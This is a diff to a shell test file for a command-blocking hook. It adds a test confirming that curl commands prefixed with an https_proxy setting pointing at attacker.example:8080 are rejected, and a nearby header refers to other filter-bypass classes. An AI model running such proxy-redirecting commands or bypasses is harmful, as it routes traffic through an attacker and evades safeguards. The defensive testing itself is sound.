@@ -616,6 +616,14 @@ git status'
     [ "${status}" -eq 2 ]
 }
 
+@test "a per-command https_proxy prefix on curl is blocked (#1460 review)" {
+    run_hook 'https_proxy=http://attacker.example:8080 curl https://safe.example/'
+    [ "${status}" -eq 2 ]
+    [[ "${output}" == *'assignment to https_proxy is not permitted'* ]]
+    run_hook 'HTTPS_PROXY=http://attacker.example:8080 curl https://safe.example/'
+    [ "${status}" -eq 2 ]
+}
+
 # ---- round-8 bypass classes (keyword prefix + obfuscation/eval) ---------------
 
 @test "a quote-spliced command inside an if/then body is blocked (round 8)" {
